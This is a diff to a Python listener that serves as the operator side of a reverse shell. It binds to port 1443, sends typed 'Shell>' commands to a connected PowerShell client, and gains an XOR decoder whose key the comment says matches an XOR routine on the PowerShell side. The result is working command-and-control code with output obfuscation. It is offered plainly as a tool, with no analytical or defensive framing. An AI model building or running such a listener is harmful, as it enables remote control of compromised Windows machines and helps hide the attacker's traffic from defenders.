@@ -3,19 +3,23 @@ from datetime import datetime
 
 HOST = '0.0.0.0'
 PORT = 1443
+XOR_KEY = 0x5A  # Same key used in PowerShell XOR()
+
+def xor_decode(data, key=XOR_KEY):
+    return ''.join(chr(b ^ key) for b in data)
 
 def handler(conn, addr):
     print(f"[+] Connection from {addr[0]}:{addr[1]} at {datetime.now()}")
     try:
         while True:
-            cmd = input("Shell> ")  # Clear prompt
+            cmd = input("Shell> ")
             if not cmd.strip():
-                continue  # Skip empty commands
-            cmd += '\n'  # Critical newline for PowerShell input
+                continue
+            cmd += '\n'
             conn.sendall(cmd.encode('ascii'))
 
             response = b''
-            conn.settimeout(2.0)  # Timeout ensures you don't hang forever
+            conn.settimeout(2.0)
             try:
                 while True:
                     chunk = conn.recv(4096)
@@ -25,9 +29,15 @@ def handler(conn, addr):
                     if len(chunk) < 4096:
                         break
             except socket.timeout:
-                pass  # Normal, just means we got all data
+                pass
 
-            print(response.decode('ascii', errors='ignore'))
+            try:
+                decoded = xor_decode(response)
+                print(decoded)
+            except Exception as e:
+                print("[!] Failed to decode XOR. Showing raw output:")
+                print(response.decode('ascii', errors='ignore'))
+
     except (ConnectionResetError, BrokenPipeError):
         print("[!] Connection closed by remote host.")
     finally:
